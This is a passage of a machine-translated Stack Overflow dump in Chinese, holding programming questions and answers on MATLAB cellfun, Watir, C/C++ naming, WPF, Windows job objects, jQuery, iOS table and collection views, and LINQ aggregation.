> [A1,...,Am] = cellfun(func,C1,...,Cn) 调用由函数句柄 func 指定的函数，并从元胞数组 C1,...,Cn 中传递元素，其中 n 是函数 func 的输入。**输出数组 A1,...,Am，其中 m 是函数 func 的输出数**，包含函数调用的组合输出。

所以是的，`cellfun`可以使用多输出函数，在这种情况下，它只是返回多个输出。如果您只想使用第二个，您可以使用`~`忽略第一个。[匿名函数的多个输出也是如此 - 如果您指定多个输出参数](http://www.mathworks.se/help/matlab/matlab_prog/anonymous-functions.html)，它们将被返回。这是一个简单的代码：

```
function test
    x{1} = 1;
    x{2} = 2;
    [~, B] = cellfun(@foo, x);
    f=@(c)foo(c);
    [A, B] = f(1);

    function [a b] = foo(x)
        a = x+1;
        b = x+2;
    end
end 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-09-15T16:20:27.567

这可以通过使用元胞数组作为函数的单个输出而不是具有多个输出的函数来完成。

定义您的函数以返回一个元胞数组（或创建一个调用原始多输出函数的辅助函数）：

```
function F = foo2(x)
  [a,b,c] = foo(x);
  F = {a, b, c};
end 
```

然后你可以创建一个句柄来调用你的函数并从单元格数组中只获取一个单元格。

```
f = @(x) cell(foo2(x)){2} % This selects the second output
g = @(x) cell(foo2(x)){3} % This selects the third output 
```

这几乎正​​是您所要求的。您甚至可以创建一个返回第 n 个输出的句柄

```
f = @(x,n) cell(foo2(x)){n} 
```*

# rubygems - 使用 Watir 检索文本

> ID：13490045
> 
> 赞同：2
> 
> 时间：2012-11-21T09:27:22.567
> 
> 标签：rubygems, automated-tests, watir-webdriver

我有一个像

```
<div class="main-div font-color page-padding">
  <div>
    <table>
      <tbody>
        <tr>
          <td style="vertical-align:middle">
            <img src="resources/images/info.png" id="indicator" class="sd-img" style="vertical-align:middle;margin-top:-3px;margin- left:-4px;">
            &nbsp; 
            <font color="#1F91D0"> <b>{{someMessage}}</b></font>
          </td> 
        </tr>
      </tbody>
    </table>
  </div>
  <br/>
</div> 
```

我正在运行 Ruby-Watir 自动化脚本。我无法使用 或`{{someMessage}}`中的文本访问元素。如何检索上面的文本值？`<b></b>``<td></td>``{{someMessage}}`

我试着做：

```
def getElementById(elementId)
  if @browser.element(:id => elementId).exists?
    @element = @browser.element(:id => elementId)
  end
  @element
end 
```

在哪里`elementId = id`。`td`但我不能赋值`@element`？

对此有任何指示或示例代码会有所帮助吗？谢谢。

`<td>`用 id 和`<table>`by引用`id`并访问元素但不能

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:08:42.857

您说您已经尝试`td`使用它的属性访问元素`id`，但是在您提供的 HTML 中，唯一具有`id`属性的元素是`img`. 如果是这种情况，您可以使用`id`属性`img`来访问文本：

```
@browser.img(:id => "indicator").parent.text 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T09:11:07.037

@Zeljko 菲律宾，谢谢。我后来试过这个 -

```
def getTableElementById(tableId, rowId, colId)      
  @table = @browser.table(:id => tableId)
  @element = @table.tr(:id => rowId).td(:id => colId)
  @element
end 
```

有用！

# c++ - 为什么在 C/C++ 中大量使用缩写？

> ID：13490049
> 
> 赞同：13
> 
> 时间：2012-11-21T09:27:34.813
> 
> 标签：c++, c

我最近一直在阅读 C 和 C++ 并且不禁动摇 C/C++ 程序员使用缩写方式过度使用变量和函数名称的感觉。我看不出这是有益的原因，因为两者都是编译语言。实际上，我遇到的所有代码都比其他语言更多地使用缩写（当然是我的个人经验）。

那么问题就变成了这个；您是否有理由要在 C/C++ 中使用缩写？使用较长的变量名是否存在性能问题，还是只是一种约定？

编辑：看起来我在这里开了一罐蠕虫。我希望得到一个是/否的答案，而不是关于编码风格的讨论。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-21T09:29:37.290

这主要是一个约定。

有一些历史需求，因为早期的 C 编译器不保证标识符在某些情况下对超过 8 个（甚至可能是 6 个）字符有意义（导致编译`MyFantasticFoo`器`MyFantasticBar`认为相等）。现代编译器没有如此严格的限制，有关详细信息，请参阅[此答案](https://stackoverflow.com/a/2352218/28169)。

今天，我认为这更像是一个约定/风格问题，C 代码通常很简洁。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-21T09:42:32.733

这是编程早期的遗留物——在人们意识到编程的困难部分不是编写代码，而是阅读它之前。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-21T09:50:06.920

首先，我认为这不是一般规则；正如 Steve Jessop 在评论中提醒我们的那样，其他语言，如 APL，传统上使用更短的名称，而 Fortran（至少在我使用它时）将最大名称长度限制为六个。

不仅仅是语言，我认为领域也很重要。例如，Unix 程序员倾向于使用比 Windows 程序员更短的名称，这无疑是因为系统 API 使用更短的名称（至少部分是因为 Unix 更老，而且早期的链接器不能处理超过 6 或 8 个符号——尽管这没有解释`creat`而不是 `create`）。数学也有缩短名称的传统：在处理数学表达式时使用类似`index`, 而不是索引的名称会使代码*变得不那么* 清晰和难以解释，因为数学中第一个索引的传统符号是`i`*`i`. 许多其他领域或多或少都有首字母缩略词或缩写：当我在电信工作时，规范文档（来自客户）谈到了 TP 和 CX，而不是终结点和交叉连接；在我目前的银行环境中，即使在程序之外，没有人会写“信用违约掉期”或“抵押债务义务”而不是简单的 CDS 或 CDO。因此，如果您在 C++ 中看到较短的名称，可能是因为您正在查看执行不同操作的代码，并且来自一个即使在编程环境之外也经常使用缩写的域。*

# wpf - 如何根据单元格值为列表视图设置数据触发器？

> ID：13490054
> 
> 赞同：0
> 
> 时间：2012-11-21T09:27:55.623
> 
> 标签：wpf, visual-studio-2010, xaml

嗨，我曾经使用过数据网格，但使用选项卡时速度太慢了，所以我切换到 ListView 但我不知道如何设置它的样式（在我看来，它比 DataGrid 复杂得多）。

所以我想知道如何为 ListView 执行此操作：

```
<Style x:Key="gridCell" TargetType="DataGridCell">
    <Setter Property="BorderBrush"
   Value="{StaticResource lightBlueBrush}" />
    <Style.Triggers>
        <DataTrigger Binding="{Binding Path=Status}" Value="Otpisano">
            <Setter Property="Background" Value="Red"/>
        </DataTrigger>
    </Style.Triggers>
</Style> 
```

然后在视图中

```
CellStyle="{StaticResource gridCell}" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:28:12.557

这就是你做造型的方式：

[回答](http://social.msdn.microsoft.com/Forums/en-US/wpf/thread/c2558545-f9fd-43b4-a7a5-a9fdc10d0be1)

# c - 如何在不知道其名称的情况下获取 JobObject 的句柄？

> ID：13490055
> 
> 赞同：2
> 
> 时间：2012-11-21T09:27:57.683
> 
> 标签：c, windows, jobs

我的应用程序正在工作中运行。我想使用这个 Jobobject 获得一个句柄，`OpenJobObject`以便以后可以使用这个句柄。问题是，我不知道作业名称，并且通过将 NULL 传递给作业名称，它会返回错误 87（参数不正确）。

这就是我尝试的方式：

```
HANDLE handle = OpenJobObject( JOB_OBJECT_QUERY, FALSE, NULL );
if ( !handle  ) printf( "\nError %d", GetLastError() );
else printf( "\nOK" ); 
```

我还在 MSDN 上找到了这一点：应用程序无法获取正在运行的作业对象的句柄，除非它具有作业对象的名称。但是，应用程序可以使用 NULL 调用 QueryInformationJobObject 函数来获取有关作业对象的信息。

所以我的问题是，是否有可能以某种方式获得运行我的应用程序的 JobObject 的句柄？或者获取我的应用程序正在运行的作业的名称？

谢谢！

更新：
到目前为止我的代码：[http](http://pastebin.com/aJ7XMmci) ://pastebin.com/aJ7XMmci 现在，我收到错误 87（参数不正确）来自`SetInformation`:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T21:28:17.817

好的，看起来没有任何受支持的方法。这并不意味着它不能完成！:-)

要枚举系统中的所有句柄，请参阅[此问题](https://stackoverflow.com/questions/733384/how-to-enumerate-process-handles)。[此处](http://forum.sysinternals.com/topic18892.html)的示例代码过滤句柄并仅查找属于特定进程的句柄，但这很容易更改。您可能需要先启用调试权限。

对于每个句柄，将其复制到您的进程中，然后调用 IsProcessInJob 以确定它是否是正确的句柄。

完成该工作后，检查`SYSTEM_HANDLE.ObjectTypeNumber`作业对象是否始终相同。它可能是（至少在任何给定的操作系统上）在这种情况下，您可以通过仅检查作业对象句柄来大大提高代码的效率。

您也许还可以过滤到仅运行辅助登录服务的进程，因为这似乎是为 runas 创建作业对象的原因。

（如果你确实得到了这个工作，请发布代码 - 它可能对未来的访问者非常有用。）

# javascript - 与 jquery 相乘

> ID：13490056
> 
> 赞同：0
> 
> 时间：2012-11-21T09:28:06.653
> 
> 标签：javascript, jquery

我有这个简单的脚本，我想将 Var a * Var b 相乘，然后将其乘以 Var C 与一个设定的数字，例如 15。

但它似乎不起作用？

```
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>

<script>
$('input[name="box2"]').keyup(function() {
    var a = $('input[name="box1"]').val();
    var b = $(this).val();
    var c = $(15).val();
    $('input[name="box3"]').val(a * b * c);
});
​
</script>
</head>

<body>
<input name="box1" type="text" /><br />
<input name="box2" type="text" /><br />
<input name="box3" type="text" />
</body> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T09:31:39.833

要做的一些改变：

```
var a = parseInt($('input[name="box1"]').val(), 10);
var b = parseInt($(this).val(), 10);
var c = 15; // really no need to try to build a dom element to get an int 
```

注意永远不要在没有指定基数 ( )的情况下使用[parseInt 。](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/parseInt)`parseInt("09") is 0...`

您的代码中的另一个问题是您尝试在 dom 准备好之前构建您的 jquery 集合。用这个 ：

```
<script>
$(function(){
   $('input[name="box2"]').keyup(function() {
     var a = $('input[name="box1"]').val();
     var b = $(this).val();
     var c = $(15).val();
     $('input[name="box3"]').val(a * b * c);
   });
});
</script> 
```

请注意，这也是最佳实践，尤其是在使用 jQuery 时，这很容易，在正文的末尾有一个脚本元素，以保留所有不在单独文件中的 javascript。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T09:31:16.740

更改`var c = $(15).val();`为`var c=15;`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T09:29:20.277

您应该将字符串值解析为 int：

```
var a = parseInt($('input[name="box1"]').val()); 
```

# uitableview - 故事板中的 UITableView

> ID：13490060
> 
> 赞同：1
> 
> 时间：2012-11-21T09:28:30.997
> 
> 标签：uitableview, uiviewcontroller, initialization, storyboard

你好stackoverflow的家伙！

我有一个问题，我不知道如何解决它......

我有一个带有 UINavigationController 的 StoryBoard，它有一个 UIViewController 作为 RootViewController。在这个 RootViewController 中，我有 2 个 UIButton。

第一个 UIButton`instantiateViewControllerWithIdentifier`一个 UICollectionViewController 它工作得很好。

第二个UIButton`instantiateViewControllerWithIdentifier`是一个 UIViewController，它有 2 个 UITableView。这是我实例化 UIViewController 时的问题，我的 2 UITableView 加载良好，但是当我触摸它（滚动）时出现此错误：

```
-[__NSCFType scrollViewDidScroll:]: unrecognized selector sent to instance 0x752ff90
2012-11-21 10:22:49.300 Month[19992:11303] *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[__NSCFType scrollViewDidScroll:]: unrecognized selector sent to instance 0x752ff90' 
```

但是当我把它做成 RootViewController 时，一切都如我所愿......所以只有当 RootViewController 实例化我的 UIViewController 时，我才会崩溃。

这就是我按下 UIButton 时实例化 UIViewController 的方式：

```
 DayViewController *viewController = [self.storyboard instantiateViewControllerWithIdentifier:@"calendarDay"]; 
```

希望你能帮助我提供这些信息。

问候，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T12:50:58.133

看起来好像您有一个正在用作 a 的对象，`UIScrollViewDelegate`并且该对象被释放得太早了。（`[__NSCFType scrollViewDidScroll:]`表示消息正在发送到 Core Foundation 项目，这可能意味着对象地址正在被重用于其他东西。）

您显示的用于创建 a 的代码`DayViewController`会将对象分配给局部变量。假设您使用的是 ARC，如果这是用作委托的对象，请尝试将其分配给强属性。如：

```
// .h file
@property (nonatomic, strong) DayViewController *viewController;

// .m file
self.viewController = [self.storyboard instantiateViewControllerWithIdentifier:@"calendarDay"]; 
```

# c# - LINQ 与 TimeSpan、GROUP 和 JOIN 的 SUM 的结果

> ID：13490063
> 
> 赞同：-1
> 
> 时间：2012-11-21T09:28:35.433
> 
> 标签：c#, linq, entity-framework, group-by, sum

我遵循 EF 模型：

![在此处输入图像描述](../Images/d591838233b641aa2f7242a62d9ea85c.png)

我想在以下视图中获取数据：

![在此处输入图像描述](../Images/f58e45206a7a60edc8ac4ccd0ec2a652.png)

在数据实体中，时间是以毫秒为单位的时间跨度。结果，`PlaceInStep`是成员之间的位置 by `StepId`。

如何进行这个硬查询？

**编辑 1**：

我的一些代码：

```
var query = from data in ctx.Data
                            join member in ctx.Members
                            on data.MemberId equals member.MemberId
                            join team in ctx.Teams
                            on member.TeamId equals team.TeamId
                            group member by member.TeamId into g
                            select new {TeamId = g.Key, TeamName = g.Select(t=>t.Teams.TeamName), TotalTime = ???}; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:42:54.977

一开始的建议。您不应该在查询中使用 join。您的模型具有导航属性，请改用它们。您可以阅读 Craig Stuntz 的博[文](http://blogs.teamb.com/craigstuntz/2010/01/13/38525/)。

您可以在内部列表中选择所有团队和有关成员的信息。试试这个：

```
var query = ctx.data.ToList().OrderBy(d => d.Time).
            GroupBy(d => d.Members.StepId).
            SelectMany(g => g.Select((d, place) => new { Time = d.Time, Members = d.Members, PlaceInStep = place + 1 })).
            GroupBy(d => d.Members.TeamId).
            Select(g => new 
            {
               TeamId = g.Key, 
               Name = g.Select(d => d.Members.Teams.TeamName).First(),  
               Members = g.Select(d => new {Time = d.Time, PlaceInStep = d.PlaceInStep, MemberName = d.Members.MemberName}),                    
               TotalTime = g.Aggregate(new TimeSpan(), (sum, nextData) => sum.Add(nextData.Time))
            }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T11:00:25.140

试试这个：

```
var query = ctx.Data.Join(ctx.Members, d => d.MemberId, m => m.MemberId, (d,m)=>new {data=d, member = m})
                .Join(ctx.Teams, dm=>dm.member.TeamId, t=>t.TeamId, (dm, t)=>new{data=dm.data, member=dm.member, team = t})
                .GroupBy(dmt=>new {dmt.team.TeamId, dmt.team.TeamName})
                .Select(g=>new 
                           {
                               TeamId = g.Key.TeamId, 
                               TeamName = g.Key.TeamName, 
                               TotalTime = g.Aggregate(0, (sum, gr)=>sum.Add(gr.data.Time))
                           }); 
```

# ios - 在旋转界面方向时将 contentOffset 保持在 UICollectionView 中

> ID：13490065
> 
> 赞同：74
> 
> 时间：2012-11-21T09:28:45.620
> 
> 标签：ios, objective-c, cocoa-touch, uiscrollview, uicollectionview

我正在尝试处理 UICollectionViewController 中的界面方向更改。我想要实现的是，我希望在界面旋转后拥有*相同的 contentOffset 。*意思是，它应该根据边界变化的比率而改变。

从纵向开始，内容偏移量为 { *bounds.size.width* * 2, 0} ...</p>

![肖像中的 UICollectionView](../Images/2844fba4289caf0145d66cec77170883.png)

...应该导致横向内容偏移也与 { *bounds.size.width* * 2, 0} （反之亦然）。

![UICollectionView 在横向](../Images/4c38671dca7d0c522aee1b915bb8c4e2.png)

计算新的偏移量不是问题，但不知道在哪里（或何时）设置它，以获得平滑的动画。我所做的是使布局无效`willRotateToInterfaceOrientation:duration:`并重置内容偏移量`didRotateFromInterfaceOrientation:`：

```
- (void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation
                                duration:(NSTimeInterval)duration;
{
    self.scrollPositionBeforeRotation = CGPointMake(self.collectionView.contentOffset.x / self.collectionView.contentSize.width,
                                                    self.collectionView.contentOffset.y / self.collectionView.contentSize.height);
    [self.collectionView.collectionViewLayout invalidateLayout];
}

- (void)didRotateFromInterfaceOrientation:(UIInterfaceOrientation)fromInterfaceOrientation;
{
    CGPoint newContentOffset = CGPointMake(self.scrollPositionBeforeRotation.x * self.collectionView.contentSize.width,
                                           self.scrollPositionBeforeRotation.y * self.collectionView.contentSize.height);
    [self.collectionView newContentOffset animated:YES];
} 
```

这会更改旋转后的内容偏移量。

如何在旋转期间设置它？我试图设置新的内容偏移量，`willAnimateRotationToInterfaceOrientation:duration:`但这会导致非常奇怪的行为。

可以在我的[GitHub](https://github.com/anagromataf/TKViewControllerCollectionController/blob/develop/TKViewControllerCollectionController/TKViewControllerCollectionController.m#L86)项目中找到一个示例。

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2017-04-10T12:05:17.093

您可以在视图控制器中执行此操作：

```
override func viewWillTransition(to size: CGSize, with coordinator: UIViewControllerTransitionCoordinator) {
    super.viewWillTransition(to: size, with: coordinator)

    guard let collectionView = collectionView else { return }
    let offset = collectionView.contentOffset
    let width = collectionView.bounds.size.width

    let index = round(offset.x / width)
    let newOffset = CGPoint(x: index * size.width, y: offset.y)

    coordinator.animate(alongsideTransition: { (context) in
        collectionView.reloadData()
        collectionView.setContentOffset(newOffset, animated: false)
    }, completion: nil)
} 
```

或者在布局本身：[https ://stackoverflow.com/a/54868999/308315](https://stackoverflow.com/a/54868999/308315)

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2014-03-11T20:25:04.273

# 解决方案 1，“快拍”

如果您只需要确保 contentOffset 以正确的位置结束，您可以创建 UICollectionViewLayout 的子类并实现*targetContentOffsetForProposedContentOffset:*方法。例如，您可以执行以下操作来计算页面：

```
- (CGPoint)targetContentOffsetForProposedContentOffset:(CGPoint)proposedContentOffset
{
    NSInteger page = ceil(proposedContentOffset.x / [self.collectionView frame].size.width);
    return CGPointMake(page * [self.collectionView frame].size.width, 0);
} 
```

但是您将面临的问题是该过渡的动画非常奇怪。我对我的案子（几乎和你的案子一样）正在做的是：

# 解决方案2，“流畅的动画”

1）首先我设置单元格大小，可以通过*collectionView:layout:sizeForItemAtIndexPath:*委托方法管理如下：

```
- (CGSize)collectionView:(UICollectionView *)collectionView
                  layout:(UICollectionViewLayout  *)collectionViewLayout
  sizeForItemAtIndexPath:(NSIndexPath *)indexPath
{
    return [self.view bounds].size;
} 
```

请注意，[self.view bounds] 将根据设备旋转而改变。

2) 当设备即将旋转时，我在集合视图的顶部添加了一个带有所有调整大小掩码的 imageView。这个视图实际上会隐藏 collectionView 的怪异（因为它在它之上），并且由于 willRotatoToInterfaceOrientation: 方法在动画块内被调用，它会相应地旋转。我还根据显示的 indexPath 保留下一个 contentOffset，以便在旋转完成后修复 contentOffset：

```
- (void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation
                                duration:(NSTimeInterval)duration
{
    // Gets the first (and only) visible cell.
    NSIndexPath *indexPath = [[self.collectionView indexPathsForVisibleItems] firstObject];
    KSPhotoViewCell *cell = (id)[self.collectionView cellForItemAtIndexPath:indexPath];

    // Creates a temporary imageView that will occupy the full screen and rotate.
    UIImageView *imageView = [[UIImageView alloc] initWithImage:[[cell imageView] image]];
    [imageView setFrame:[self.view bounds]];
    [imageView setTag:kTemporaryImageTag];
    [imageView setBackgroundColor:[UIColor blackColor]];
    [imageView setContentMode:[[cell imageView] contentMode]];
    [imageView setAutoresizingMask:0xff];
    [self.view insertSubview:imageView aboveSubview:self.collectionView];

    // Invalidate layout and calculate (next) contentOffset.
    contentOffsetAfterRotation = CGPointMake(indexPath.item * [self.view bounds].size.height, 0);
    [[self.collectionView collectionViewLayout] invalidateLayout];
} 
```

请注意，我的 UICollectionViewCell 子类具有公共 imageView 属性。

3）最后，最后一步是将内容偏移“捕捉”到有效页面并删除临时图像视图。

```
- (void)didRotateFromInterfaceOrientation:(UIInterfaceOrientation)fromInterfaceOrientation
{
    [self.collectionView setContentOffset:contentOffsetAfterRotation];
    [[self.view viewWithTag:kTemporaryImageTag] removeFromSuperview];
} 
```

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2014-03-18T20:58:32.093

上面的“快速捕捉”答案对我不起作用，因为它经常没有在旋转之前看到的项目上结束。所以我派生了一个使用焦点项目（如果设置）来计算内容偏移量的流布局。我在 willAnimateRotationToInterfaceOrientation 中设置项目并在 didRotateFromInterfaceOrientation 中清除它。在 IOS7 上似乎需要进行插图调整，因为 Collection 视图可以布局在顶部栏下。

```
@interface HintedFlowLayout : UICollectionViewFlowLayout
@property (strong)NSIndexPath* pathForFocusItem;
@end

@implementation HintedFlowLayout

-(CGPoint)targetContentOffsetForProposedContentOffset:(CGPoint)proposedContentOffset
{
    if (self.pathForFocusItem) {
        UICollectionViewLayoutAttributes* layoutAttrs = [self layoutAttributesForItemAtIndexPath:self.pathForFocusItem];
        return CGPointMake(layoutAttrs.frame.origin.x - self.collectionView.contentInset.left, layoutAttrs.frame.origin.y-self.collectionView.contentInset.top);
    }else{
        return [super targetContentOffsetForProposedContentOffset:proposedContentOffset];
    }
}
@end 
```

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2015-03-16T14:57:03.757

对于使用 iOS 8+ 的用户，不推荐使用*willRotateToInterfaceOrientation*和*didRotateFromInterfaceOrientation*。

您现在应该使用以下内容：

```
/* 
This method is called when the view controller's view's size is changed by its parent (i.e. for the root view controller when its window rotates or is resized). 
If you override this method, you should either call super to propagate the change to children or manually forward the change to children.
*/
- (void)viewWillTransitionToSize:(CGSize)size withTransitionCoordinator:(id <UIViewControllerTransitionCoordinator>)coordinator 
{
    [super viewWillTransitionToSize:size withTransitionCoordinator:coordinator];

    [coordinator animateAlongsideTransition:^(id<UIViewControllerTransitionCoordinatorContext> context) {
        // Update scroll position during rotation animation
        self.collectionView.contentOffset = (CGPoint){contentOffsetX, contentOffsetY};
    } completion:^(id<UIViewControllerTransitionCoordinatorContext> context) {
        // Whatever you want to do when the rotation animation is done
    }];
} 
```

斯威夫特 3：

```
override func viewWillTransition(to size: CGSize, with coordinator: UIViewControllerTransitionCoordinator) {
    super.viewWillTransition(to: size, with: coordinator)

    coordinator.animate(alongsideTransition: { (context:UIViewControllerTransitionCoordinatorContext) in
        // Update scroll position during rotation animation
    }) { (context:UIViewControllerTransitionCoordinatorContext) in
        // Whatever you want to do when the rotation animation is done
    }
} 
```

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2019-02-25T15:00:07.233

Swift 4.2 子类：

```
class RotatableCollectionViewFlowLayout: UICollectionViewFlowLayout {

    private var focusedIndexPath: IndexPath?

    override func prepare(forAnimatedBoundsChange oldBounds: CGRect) {
        super.prepare(forAnimatedBoundsChange: oldBounds)
        focusedIndexPath = collectionView?.indexPathsForVisibleItems.first
    }

    override func targetContentOffset(forProposedContentOffset proposedContentOffset: CGPoint) -> CGPoint {
        guard let indexPath = focusedIndexPath
            , let attributes = layoutAttributesForItem(at: indexPath)
            , let collectionView = collectionView else {
                return super.targetContentOffset(forProposedContentOffset: proposedContentOffset)
        }
        return CGPoint(x: attributes.frame.origin.x - collectionView.contentInset.left,
                       y: attributes.frame.origin.y - collectionView.contentInset.top)
    }

    override func finalizeAnimatedBoundsChange() {
        super.finalizeAnimatedBoundsChange()
        focusedIndexPath = nil
    }
} 
```

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2014-03-08T04:57:53.400

我认为正确的解决方案是覆盖[targetContentOffsetForProposedContentOffset:](https://developer.apple.com/library/ios/documentation/UIKit/Reference/UICollectionViewLayout_class/Reference/Reference.html#//apple_ref/occ/instm/UICollectionViewLayout/targetContentOffsetForProposedContentOffset:)子类中的方法`UICollectionViewFlowLayout`

从文档：

> 在布局更新期间，或在布局之间转换时，集合视图会调用此方法，让您有机会更改建议的内容偏移以在动画结束时使用。如果动画或过渡可能导致项目以不适合您的设计的方式定位，您可以覆盖此方法。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2016-10-03T23:40:04.943

要[背负 troppoli 的](https://stackoverflow.com/a/22490909/461148)解决方案，您可以在自定义类中设置偏移量，而不必担心记住在视图控制器中实现代码。`prepareForAnimatedBoundsChange`应该在您旋转设备然后`finalizeAnimatedBoundsChange`在其完成旋转后调用。

```
@interface OrientationFlowLayout ()

@property (strong)NSIndexPath* pathForFocusItem;

@end

@implementation OrientationFlowLayout

- (CGPoint)targetContentOffsetForProposedContentOffset:(CGPoint)proposedContentOffset {
    if (self.pathForFocusItem) {
        UICollectionViewLayoutAttributes* layoutAttrs = [self layoutAttributesForItemAtIndexPath:
                                                         self.pathForFocusItem];
        return CGPointMake(layoutAttrs.frame.origin.x - self.collectionView.contentInset.left,
                           layoutAttrs.frame.origin.y - self.collectionView.contentInset.top);
    }
    else {
        return [super targetContentOffsetForProposedContentOffset:proposedContentOffset];
    }
}

- (void)prepareForAnimatedBoundsChange:(CGRect)oldBounds {
    [super prepareForAnimatedBoundsChange:oldBounds];
    self.pathForFocusItem = [[self.collectionView indexPathsForVisibleItems] firstObject];
}

- (void)finalizeAnimatedBoundsChange {
    [super finalizeAnimatedBoundsChange];
    self.pathForFocusItem = nil;
}

@end 
```

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2014-11-13T14:45:12.560

这个问题也困扰了我一点。投票最高的答案对我来说似乎有点太老套了，所以我只是把它简化了一点，然后分别在旋转之前和之后更改集合视图的 alpha。我也不会为内容偏移更新设置动画。

```
- (void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration
{
self.collectionView.alpha = 0;
[self.collectionView.collectionViewLayout invalidateLayout];

self.scrollPositionBeforeRotation = CGPointMake(self.collectionView.contentOffset.x / self.collectionView.contentSize.width,
                                                self.collectionView.contentOffset.y / self.collectionView.contentSize.height);
}

- (void)didRotateFromInterfaceOrientation:(UIInterfaceOrientation)fromInterfaceOrientation;
{
CGPoint newContentOffset = CGPointMake(self.scrollPositionBeforeRotation.x * self.collectionView.contentSize.width,
                                       self.scrollPositionBeforeRotation.y * self.collectionView.contentSize.height);

[self.collectionView setContentOffset:newContentOffset animated:NO];
self.collectionView.alpha = 1;
} 
```

相当流畅，不那么骇人听闻。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2015-04-29T08:20:45.090

我使用 fz 的变体。答案（iOS 7 和 8）：

旋转前：

1.  存储当前可见索引路径
2.  创建collectionView的快照
3.  将 UIImageView 与它放在集合视图的顶部

旋转后：

1.  滚动到存储的索引
2.  删除图像视图。

    ```
    @property (nonatomic) NSIndexPath *indexPath;

    - (void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation
                                    duration:(NSTimeInterval)duration {
        self.indexPathAfterRotation = [[self.collectionView indexPathsForVisibleItems] firstObject];

        // Creates a temporary imageView that will occupy the full screen and rotate.
        UIGraphicsBeginImageContextWithOptions(self.collectionView.bounds.size, YES, 0);
        [self.collectionView drawViewHierarchyInRect:self.collectionView.bounds afterScreenUpdates:YES];
        UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
        UIGraphicsEndImageContext();

        UIImageView *imageView = [[UIImageView alloc] initWithImage:image];
        [imageView setFrame:[self.collectionView bounds]];
        [imageView setTag:kTemporaryImageTag];
        [imageView setBackgroundColor:[UIColor blackColor]];
        [imageView setContentMode:UIViewContentModeCenter];
        [imageView setAutoresizingMask:0xff];
        [self.view insertSubview:imageView aboveSubview:self.collectionView];

        [[self.collectionView collectionViewLayout] invalidateLayout];
    }

    - (void)didRotateFromInterfaceOrientation:(UIInterfaceOrientation)fromInterfaceOrientation {
        [self.collectionView scrollToItemAtIndexPath:self.indexPath atScrollPosition:UICollectionViewScrollPositionCenteredHorizontally animated:NO];

        [[self.view viewWithTag:kTemporaryImageTag] removeFromSuperview];
    } 
    ```

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2016-12-28T11:40:37.647

在斯威夫特 3。

您应该在通过 indexPath.item、x 坐标或其他东西旋转之前跟踪正在呈现的单元格项目（页面）。然后，在您的 UICollectionView 中：

```
override func collectionView(_ collectionView: UICollectionView, targetContentOffsetForProposedContentOffset proposedContentOffset: CGPoint) -> CGPoint {

    let page:CGFloat = pageNumber // your tracked page number eg. 1.0
    return CGPoint(x: page * collectionView.frame.size.width, y: -(topInset))
    //the 'y' value would be '0' if you don't have any top EdgeInset
} 
```

就我而言，我使 viewDidLayoutSubviews() 中的布局无效，因此 collectionView.frame.size.width 是已旋转的 collectionVC 视图的宽度。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2015-10-26T06:01:15.583

旋转界面方向后，UICollectionViewCell 通常会移动到另一个位置，因为我们不会更新 contentSize 和 contentOffset。

所以可见的 UICollectionViewCell 总是不在预期的位置。

我们期望的可见 UICollectionView 图像如下

[我们期望的方向](http://i.stack.imgur.com/uPksd.png)

UICollectionView 必须委托『UICollectionViewDelegateFlowLayout』的函数[collectionView sizeForItemAtIndexPath]。

您应该在此函数中计算项目大小。

自定义 UICollectionViewFlowLayout 必须覆盖以下函数。

1.  `-(void)prepareLayout`

    ．设置 itemSize、scrollDirection 等。

2.  `-(CGPoint)targetContentOffsetForProposedContentOffset:(CGPoint)proposedContentOffset withScrollingVelocity:(CGPoint)velocity`

    ．计算页码或计算可见内容偏移量。

3.  `-(CGPoint)targetContentOffsetForProposedContentOffset:(CGPoint)proposedContentOffset`

    ．返回视觉内容偏移量。

4.  `-(CGSize)collectionViewContentSize`

    ．返回 collectionView 的总内容大小。

你的 viewController 必须覆盖『willRotateToInterfaceOrientation』并且在这个函数中你应该调用函数[XXXCollectionVew.collectionViewLayout invalidateLayout]；

但是『willRotateToInterfaceOrientation』在 iOS 9 中被弃用了，或者你可以用不同的方式调用函数 [XXXCollectionVew.collectionViewLayout invalidateLayout]。

有一个例子如下： [https ://github.com/bcbod2002/CollectionViewRotationTest](https://github.com/bcbod2002/CollectionViewRotationTest)

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2014-11-25T20:38:58.790

如果发现使用 targetContentOffsetForProposedContentOffset 并不适用于所有场景，并且使用 didRotateFromInterfaceOrientation 的问题是它会产生视觉伪影。我完美的工作代码如下：

```
